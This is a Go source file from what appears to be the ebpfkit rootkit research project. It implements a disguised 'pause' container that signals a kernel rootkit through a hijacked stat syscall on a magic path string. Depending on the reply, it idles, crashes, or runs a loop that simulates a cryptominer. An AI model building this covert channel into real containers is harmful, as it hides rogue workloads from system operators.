/*
Copyright © 2021 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package main

import (
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/Gui774ume/ebpfkit/pkg/ebpfkit"
)

func setupEBPFKit() {
	// make a stat syscall to check if this pause container should die
	ans, err := sendEBPFKitPing()
	if err != nil {
		ans = ebpfkit.PingNop
	}

	switch ans {
	case ebpfkit.PingNop:
		pause()
	case ebpfkit.PingRun:
		go pause()
		// run an infinite loop to simulate the cryptominer
		for {
			time.Sleep(1 * time.Nanosecond)
		}
	case ebpfkit.PingCrash:
		os.Exit(1)
	}
	return
}

func sendEBPFKitPing() (uint16, error) {
	pingPtr, err := syscall.BytePtrFromString("ebpfkit://ping:gui774ume/pause2")
	if err != nil {
		return ebpfkit.PingNop, err
	}

	_, _, _ = syscall.Syscall6(syscall.SYS_NEWFSTATAT, 0, uintptr(unsafe.Pointer(pingPtr)), 0, 0, 0, 0)

	switch *pingPtr {
	case 'e', '0':
		return ebpfkit.PingNop, nil
	case '1':
		return ebpfkit.PingCrash, nil
	case '2':
		return ebpfkit.PingRun, nil
	}
	return ebpfkit.PingNop, nil
}
